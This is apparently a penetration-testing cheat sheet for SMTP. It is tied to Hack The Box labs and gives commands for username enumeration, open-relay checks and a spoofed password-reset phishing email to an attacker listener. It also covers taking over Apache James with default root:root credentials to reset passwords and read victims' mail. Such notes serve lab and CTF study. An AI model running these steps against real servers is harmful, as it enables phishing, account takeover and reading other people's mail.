## Goal
Enumerate valid usernames (VRFY / RCPT) for AS-REP roast / spray, check for open relay, and — if you get mail creds — read mailboxes. SMTP is mostly a user-list source.

**Checklist**
- [ ] banner / software + version? (Postfix, Exim, Apache James)
- [ ] username enumeration works? (VRFY -> RCPT fallback)
- [ ] saved valid users to users.txt?
- [ ] open relay? (phishing)
- [ ] James admin console on 4555? (root:root)

# Commands

### Step 1: Banner + scripts
```bash
nmap -p25,465,587 -sC -sV --script "smtp-commands,smtp-enum-users,smtp-open-relay,smtp-vuln-*" $IP
```

### Step 2: Manual user enumeration
```bash
nc -nv $IP 25
HELO test.local
VRFY root                         # 250/252 = valid, 550 = invalid
VRFY admin
# VRFY disabled (502)? use RCPT:
MAIL FROM: <test@test.com>
RCPT TO: <admin@target.htb>       # 250 = exists, 550 = doesn't
```

### Step 3: Automated user enumeration
```bash
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $IP
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t $IP -D target.htb
cewl http://$IP -e --email_file emails.txt     # harvest emails from the website
```

### Step 4: Open relay check
```bash
swaks --to external@gmail.com --from root@target.htb --server $IP   # 250 = open relay
```

### Step 5: Phishing (SneakyMailer pattern)
```bash
python3 -m http.server 80        # capture the click
swaks --to victim@target.htb --from admin@target.htb --server $IP \
  --header "Subject: Password Reset" --body "http://<YOUR_IP>/reset"
```

### Step 6: Apache James console + read mail (if present)
```bash
nc $IP 4555                      # default root:root
# listusers ; setpassword <user> <newpass>
nc $IP 110                       # then read their mail via POP3
USER <user>
PASS <newpass>
LIST
RETR 1
```

### Helpline
```bash
# READING USER-ENUM RESPONSES:
#   RCPT TO -> 250 = user EXISTS ; 550 = doesn't. This is the RELIABLE method.
#   VRFY -> 252 is INCONCLUSIVE on many MTAs -> always confirm with RCPT TO before trusting the list.
#   VRFY -> 502 = disabled -> switch to RCPT TO.
# WHAT TO DO WITH RESULTS: each valid user -> Kerberos AS-REP roast (88) + password spray (ssh/smb/winrm).
#   SMTP's main value is the USER LIST.
# BANNER = path:
#   Exim 4.87-4.91 -> CVE-2019-10149 unauth RCE (searchsploit exim).
#   Apache James -> admin console on 4555, try root:root -> reset a user's pw -> read their mail (HTB SolidState).
#   Postfix/sendmail = standard -> focus on user enum.
# open relay (swaks 250 to external) -> phish internal users with a link to your listener
#   (HTB SneakyMailer: phished creds -> IMAP -> FTP creds). harvest targets with  cewl -e.
```
